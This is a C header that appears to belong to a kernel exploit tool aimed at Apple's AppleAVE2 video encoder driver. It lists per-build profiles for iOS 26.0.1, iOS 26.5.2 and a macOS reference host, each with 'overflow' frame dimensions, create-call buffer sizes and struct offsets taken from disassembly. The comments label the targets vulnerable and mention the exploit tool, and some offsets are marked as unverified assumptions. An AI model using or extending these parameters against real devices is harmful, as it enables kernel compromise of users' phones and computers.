/*
 * ave2_profiles.h — per-OS AppleAVE2 version profiles
 *
 * Device evidence (kernelcache unpack, 2026-10-22):
 *   iPhone12,1 / iOS 26.0.1 (J375c build 23A340-ish kernel, [[904.76.7]])
 *     - kernelcache_J375c_26.0.1.im4p unpacked
 *     - "LRB size overflow" count=0  (no fixed assert)
 *     - "frame dimension out of range" count=0 (no fixed product clamp log)
 *     - "frame dimension is out of range" count=7 (capability gate, both builds)
 *   iPhone11,8 / iOS 26.5.2 (23F84)
 *     - kernelcache-23F84 unpacked (kernelcache_research_26.5.2_iphone11.bin)
 *     - 9xx version string found: "905.36.1" ONLY
 *     - same signature counts: fixed-only strings absent, capability gate present
 *   => both are VULNERABLE profiles; version string is the only delta.
 */

#ifndef AVE2_PROFILES_H
#define AVE2_PROFILES_H

#include <string.h>

typedef struct {
    const char *name;        /* human label            */
    const char *kext_ver;    /* version-gate string    */
    uint32_t    w;           /* overflow width         */
    uint32_t    h;           /* overflow height        */
    uint32_t    w_ctrl;      /* control width          */
    uint32_t    h_ctrl;      /* control height         */
    /* --- create (sel1) layout, static RE 2026-10-22 --- */
    uint32_t    create_in;   /* structureInputSize  (framework max = wrapper min) */
    uint32_t    create_out;  /* structureOutputSize (framework max = wrapper min) */
    uint32_t    create_off_version;  /* version string slot inside create struct */
    uint32_t    create_off_enctype;  /* encType slot inside create struct        */
    int         create_has_log;      /* macOS 905 layout has +0x808/0x910/0x914 */
} ave2_profile_t;

/* iOS 26.0.1 — iPhone12,1 (A13) — AppleAVE2 [[904.76.7]] */
static const ave2_profile_t AVE2_PROFILE_2601 = {
    .name    = "iOS 26.0.1 iPhone12,1",
    .kext_ver = "904.76.7",
    .w       = 64656, .h = 8080,
    .w_ctrl  = 65520, .h_ctrl = 8193,
    /* static 反汇编: create wrapper 0xfffffff008b9f714:
     *   cmp w26,#0x6f0/b.lo + cmp w28,#0x27/b.ls → in>=0x6F0, out>=0x28 (wrapper)
     *   framework table max = same value → EXACT sizes 0x6F0/0x28 pass both
     *   core create: encType = ldr w2,[inbuf+0x6E8] @ 0xfffffff008b9f544
     *   version slot = inbuf+0x28 (checkParam chain) — device confirm needed */
    .create_in = 0x6F0, .create_out = 0x28,
    .create_off_version = 0x28, .create_off_enctype = 0x6E8,
    .create_has_log = 0,
};

/* iOS 26.5.2 — iPhone11,8 (A12) — AppleAVE2 [[905.36.1]] (23F84) */
static const ave2_profile_t AVE2_PROFILE_2652 = {
    .name    = "iOS 26.5.2 iPhone11,8",
    .kext_ver = "905.36.1",
    .w       = 64656, .h = 8080,
    .w_ctrl  = 65520, .h_ctrl = 8193,
    /* same 漏洞 family; assume 904.76.7 layout (26.0.1-adjacent),
     * verify against 23F84 kext 反汇编 when the 利用 tool runs there */
    .create_in = 0x6F0, .create_out = 0x28,
    .create_off_version = 0x28, .create_off_enctype = 0x6E8,
    .create_has_log = 0,
};

/* macOS 905.40.1 (reference host — full log-gate layout, WIRE_FORMAT.md) */
static const ave2_profile_t AVE2_PROFILE_MAC = {
    .name    = "macOS 26.6.2 reference (905.40.1)",
    .kext_ver = "905.40.1",
    .w       = 64656, .h = 8080,
    .w_ctrl  = 65520, .h_ctrl = 8193,
    .create_in = 0x920, .create_out = 0x28,
    .create_off_version = 0x28, .create_off_enctype = 0x918,
    .create_has_log = 1,
};

static const ave2_profile_t *ave2_profile_all[] = {
    &AVE2_PROFILE_2601,
    &AVE2_PROFILE_2652,
    NULL,
};

/* Resolve profile by env AVE2_PROFILE ("26.0.1" / "26.5.2" / "mac") or explicit index. */
static const ave2_profile_t *ave2_profile_get(int idx) {
    const char *e = getenv("AVE2_PROFILE");
    if (e) {
        if (strstr(e, "26.0")) return &AVE2_PROFILE_2601;
        if (strstr(e, "26.5")) return &AVE2_PROFILE_2652;
        if (strstr(e, "mac") || strstr(e, "905")) return &AVE2_PROFILE_MAC;
    }
    if (idx == 1) return &AVE2_PROFILE_2652;
    return &AVE2_PROFILE_2601;
}

#endif /* AVE2_PROFILES_H */
